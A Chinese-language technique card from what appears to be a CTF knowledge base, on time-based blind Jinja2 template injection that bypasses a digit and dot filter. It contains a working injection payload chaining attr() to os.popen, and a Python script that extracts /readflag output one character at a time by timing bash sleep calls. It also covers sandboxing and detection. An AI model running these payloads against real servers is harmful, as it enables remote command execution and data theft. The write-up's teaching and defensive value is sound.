---
id: web-python-ssti-jinja2-popen-bash-sleep-time-blind-digit-bypass
title: Jinja2 SSTI 只回 success/error 且过滤数字与点号：用 os.popen 跑 bash 条件判断 + sleep 做时间盲注，数字改用 echo|wc -m 生成
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-popen-bash-sleep-time-blind-wc-digit-bypass
aliases:
- SSTI 时间盲注
- os.popen sleep 盲注
- wc -m 生成数字绕过数字过滤
- cut -c 逐位比较
- 只回显 success 的 SSTI
- bash if then sleep 盲读
tags:
- python
- jinja2
- ssti
- time-based
- blind
- waf-bypass
- bash
- pyramid
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:50:41+08:00'
  notes: 已对照原文核对；本次核对未读取图片；lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')(...) 原语、黑名单 length/count/[0-9]/点/soft/%、4=3 与 (pos-1) 个占位符造数字、cut -c 逐位比较、sleep 7=6、脚本以耗时>3s 判定、先 ls / 再 /readflag 均与正文一致。未验证点：最终 flag 结果与脚本输出仅见于截图，PoC 未复跑；Pyramid/jinja2 具体版本原文未给，未标版本。
---

## 一句话结论

SSTI 的渲染结果被 `return Response('success')` 直接丢弃、且表达式里禁用数字与 `.` 时，仍可用 `lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')(...)` 把一条 bash 命令交给 `os.popen` 执行；命令里用 `if [ "\`echo $a|cut -c $(echo BB|wc -m)\`" = "x" ]; then sleep $(echo ABCDE|wc -m); fi` 做条件判断，用 `wc -m` 的字符计数**生成任意数字**（绕过数字黑名单），靠响应耗时逐位取出文件内容/命令输出。

## 原理

- **无回显的本质**：`shell_view` 只要渲染不抛异常就 `return Response('success')`，模板输出根本不进响应体。但只要模板能执行任意 Python 表达式，就可以让副作用发生在**服务端进程里**，用「时间」这个带外信道把信息送回。
- **数字为什么能造出来**：`$(echo BB | wc -m)` 输出该字符串的字符数（`BB` 换行符统计为 3），再用 `$(echo BBB|wc -m)` 得 4……于是 n 可以写成 n−1 个占位字符的 `wc -m`；`wc -c` 统计字节数，多字节字符（中文）下与 `wc -m` 结果不同，用 `-m` 才精确。
- **逐位比较怎么做**：`a=\`ls /\`` 把命令输出存进变量，`echo $a | cut -c N` 取第 N 个字符，与候选字符比较，相等则 `sleep 4`；脚本按耗时 > 3s 判定命中，逐位拼出结果。因为 `cut -c` 从 1 开始计数、`wc -m` 统计时包含换行，所以「第 N 位」需要用 `echo <N−1 个占位>|wc -m` 表示，不能直接用 N。
- **为何走 popen 而不是 `os.system`**：`os.system` 的返回值是退出码，无法直接参与模板布尔判断；`popen` 返回的流虽不读，但命令确实执行了，同样适用；进一步可直接 `attr('popen')('cmd')|attr('read')` 取输出（本场景输出被丢弃，故只借副作用）。
- **黑名单为何失效**：正则只拦 `length/count/数字/点/soft/%`，但 `attr()` 链不需要点号，数字由 `wc` 生成，`soft` 等词替换成等价命令即可；SSTI 本身未被沙箱化（`jinja2.Environment(loader=BaseLoader())`），`lipsum.__globals__` 直达 `os`。

## 触发条件

- 用户输入被当作模板渲染，且渲染环境非 `SandboxedEnvironment`；上下文里有可落到 `__globals__` 的对象（`lipsum`、`cycler`、`request`、`config`）。
- 模板输出不回显（固定字符串/被吞），但错误会返回、请求会正常完成。
- 表达式层有字符黑名单（数字、点号、`length`、`count`、`%` 等），但没有拦截 `attr`/`__globals__`/`popen`。
- 目标系统有 `bash`、`cut`、`wc`、`sleep`，且模板进程可执行系统命令。
- 允许「较慢响应」的探测（每次判断 sleep 数秒）。

## 利用步骤

1. 确认执行：`?shellcmd={{7*7}}` 之类无回显，改用能产生副作用的表达式验证，例如写文件或延时。
2. 搭执行原语：`?shellcmd={{(lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')())}}`（若回显被吞则跳过读取）。
3. 数字替代：`N = $(echo +（N−1 个占位字符）+ | wc -m)`。
4. 逐位爆破：脚本遍历字符集，把 `a=\`/readflag\`` 的输出存在 bash 变量里，`cut -c $(echo <pos-1 个 B>|wc -m)` 取第 pos 位，命中则 `sleep $(echo ABCDE|wc -m)`（=6s）。
5. 计时判定：单次请求耗时 > 阈值即认为该位命中，拼出完整输出；先 `ls /` 定位 flag 路径（数字位同样用 `wc -m` 表示），再 `/readflag` 读内容。

PoC（单次探测的 shellcmd 形态）：

```
{{(lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('a=`ls /` && if [ `echo $a|cut -c $(echo BB|wc -m)` = "e" ]\nthen\n\tsleep $(echo ABCDE|wc -m)\nfi'))|attr('read')()}}
```

```python
import time, requests, string
s = string.ascii_lowercase + "{}_-0123456789"
flag = ""
for pos in range(1, 60):
    pad = "B" * (pos - 1)          # 用 (pos-1) 个字符造出数字 pos
    for ch in s:
        cmd = ("a=`/readflag` && if [ `echo $a|cut -c $(echo %s|wc -m)` = \"%s\" ]\n"
               "then\n\tsleep $(echo ABCDE | wc -m)\nfi") % (pad, ch)
        expr = ("{{(lipsum|attr('__globals__')|attr('__getitem__')('os')"
                "|attr('popen')('%s'))|attr('read')()}}" % cmd)
        t = time.time()
        requests.get("http://target/shell", params={"shellcmd": expr}, timeout=20)
        if time.time() - t > 3:
            flag += ch
            break
```

## 变体与关联

- **判定变体**：`sleep` 之外可用重定向写文件、DNS 外带、启动子进程触发外连；耗时判定换成「响应长度/状态码」即退化为布尔盲注。
- **数字变体**：`wc -m`/`wc -c`、`${#var}`、`expr length`、`printf '%*s'` 都能造数字；被拦时换成大写/引号拆分 `bash` 与命令名。
- **回显变体**：若响应头可控，优先把输出顶到 header（`wsgiref` handler 属性）而不是盲注，成本低得多。
- **关联**：`web-python-ssti-wsgiref-handler-attribute-response-hijack`（同题的无回显直接回显解法）、`web-python-ssti-jinja2-boolean-error-blind`（报错布尔盲注）、`ctf-misc-bash-arithmetic-array-index-sleep-blind`（bash 侧同类时间侧信道原语）。

## 检测与防御

- **沙箱化**：必须用户可控模板时用 `jinja2.sandbox.SandboxedEnvironment`，并把 `__globals__`/`__subclasses__`/`attr` 等属性访问限制在允许列表。
- **不渲染用户输入**：模板来自文件而非请求参数；确需变量就用 `render(var=value)` 传参，不要 `from_string(user_input)`。
- **执行面收窄**：应用进程禁止派生 shell（容器内去掉 `bash/sleep/cut/wc`，或用 seccomp 限制 `execve`），`open_basedir`/只读根文件系统。
- **检测**：请求参数里出现 `__globals__`、`attr(`、`popen`、`sleep`、`wc -m` 组合，或单个接口出现大量固定间隔的慢请求（间隔约等于 sleep 秒数），均可判定为时间盲注探测。
